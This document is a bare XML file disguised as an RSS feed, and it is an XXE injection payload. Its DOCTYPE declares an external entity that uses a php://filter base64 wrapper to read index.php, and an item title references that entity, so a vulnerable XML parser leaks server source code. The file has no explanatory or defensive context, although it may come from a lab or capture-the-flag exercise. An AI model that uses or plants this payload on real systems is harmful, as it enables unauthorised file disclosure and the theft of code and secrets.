<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
]>
<rss xmlns:slash="http://purl.org/rss/1.0/modules/slash/" version="2.0">
	<channel>
		<item>
			<title>&xxe;</title>
		</item>
	</channel>
</rss>
